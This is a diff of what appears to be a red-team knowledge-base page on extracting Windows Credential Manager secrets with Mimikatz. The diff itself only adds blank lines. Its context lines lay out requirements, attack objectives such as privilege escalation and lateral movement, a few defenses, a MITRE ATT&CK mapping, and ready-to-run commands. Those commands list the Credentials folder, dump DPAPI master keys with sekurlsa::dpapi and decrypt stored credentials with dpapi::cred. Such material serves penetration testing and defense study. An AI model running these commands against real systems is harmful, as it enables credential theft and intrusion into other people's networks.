@@ -36,11 +36,15 @@ Technical Explanation: Mimikatz uses a variety of techniques to extract sensitiv
 
 Business Value: This technique can be used to steal credentials and gain access to critical assets, such as databases, financial systems and intellectual property. It can also be used to move laterally across the network and escalate privileges, which can lead to further compromise and data theft.
 
+ 
+
 ## Requirements
 
 1. Local administrator access to the target system
 
 1. Mimikatz tool
+
+ 
 
 ## Defense
 
@@ -50,6 +54,8 @@ Business Value: This technique can be used to steal credentials and gain access 
 
 1. Disable the storage of passwords in the Credential Manager
 
+ 
+
 ## Objectives
 
 1. Extract plaintext passwords and other sensitive data from memory
@@ -57,6 +63,8 @@ Business Value: This technique can be used to steal credentials and gain access 
 1. Bypass DPAPI encryption and extract data from the Credential Manager
 
 1. Escalate privileges and move laterally across the network
+
+ 
 
 # Instructions
 
@@ -70,13 +78,21 @@ Business Value: This technique can be used to steal credentials and gain access 
 4. Use the master key to retrieve the credentials by running the command:
    $ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
 
+ 
+
+
+
 **Code**: [[# check the folder to find credentials
 dir C:\User]]
+
+
 
 > This command retrieves Windows credentials using Mimikatz. It first checks the folder to find the credentials, then uses Mimikatz to check the file and find the master key. Finally, the master key is used to retrieve the credentials.
 
 Arguments:
 - <username>: The username of the user whose credentials are being retrieved.
+
+
 
 **Command** ([[Check folder for credentials]]):
 
@@ -84,11 +100,19 @@ Arguments:
 dir C:\Users\<username>\AppData\Local\Microsoft\Credentials\*
 ```
 
+
+
+
+
 **Command** ([[Use Mimikatz to extract credentials]]):
 
 ```bash
 $ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
 ```
+
+
+
+
 
 **Command** ([[Find master key]]):
 
@@ -96,11 +120,17 @@ $ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentia
 $ mimikatz !sekurlsa::dpapi
 ```
 
+
+
+
+
 **Command** ([[Use master key to extract credentials]]):
 
 ```bash
 $ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -123,3 +153,5 @@ $ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentia
 
 - [[Credential Manager & DPAPI]]
 - [[Windows - Mimikatz]]
+
+
